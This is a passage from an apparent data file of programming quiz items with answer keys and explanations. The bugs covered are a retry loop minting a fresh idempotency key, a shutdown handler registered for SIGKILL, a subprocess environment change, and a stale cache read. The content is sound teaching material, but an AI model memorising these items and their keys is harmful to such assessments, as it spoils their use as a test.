      "explain": "Line 3 makes a new idempotency key on every attempt. If the first request succeeded but timed out on the way back, the retry carries a different key and the server charges again. Fix: derive the key once, before the loop, from the business operation, e.g. `key = 'charge-' + order_id`."
    },
    {
      "kind": "line",
      "q": "This server never shuts down gracefully. Click the buggy line.",
      "lang": "python",
      "code": "import signal, sys\n\ndef shutdown(signum, frame):\n    server.stop_accepting()\n    server.drain(timeout=20)\n    sys.exit(0)\n\nsignal.signal(signal.SIGKILL, shutdown)\nserver.serve_forever()",
      "answer": 7,
      "explain": "Line 8 registers the handler for `SIGKILL`, which cannot be caught or ignored (Python raises an error here). Process managers send `SIGTERM` first, so register for that: `signal.signal(signal.SIGTERM, shutdown)`."
    },
    {
      "q": "What does this print?",
      "lang": "python",
      "code": "import os, subprocess\n\nos.environ['MODE'] = 'debug'\nsubprocess.run(['sh', '-c', 'export MODE=prod; echo $MODE'])\nprint(os.environ['MODE'])",
      "options": [
        "`debug` then `debug`",
        "`prod` then `prod`",
        "`prod` then `debug`",
        "`debug` then `prod`"
      ],
      "answer": 2,
      "explain": "The child inherits `MODE=debug`, then its own `export` changes its copy, so it prints `prod`. Changes in a child never propagate back to the parent, so Python still sees `debug`."
    },
    {
      "q": "What does this print?",
      "lang": "python",
      "code": "cache = {}\ndb = {'A-100': 500}\n\ndef get_price(sku):\n    if sku not in cache:\n        cache[sku] = db[sku]\n    return cache[sku]\n\nprint(get_price('A-100'))\ndb['A-100'] = 450\nprint(get_price('A-100'))",
      "options": [
        "`500` then `450`",
        "`500` then `500`",
        "`450` then `450`",
        "A `KeyError` on the second call"
      ],
      "answer": 1,
      "explain": "Cache-aside only reads the database on a miss. The first call fills the cache with `500`; the update writes only to `db` and nothing deletes the key or expires it, so the second call returns the stale `500`."
    }
  ]
});
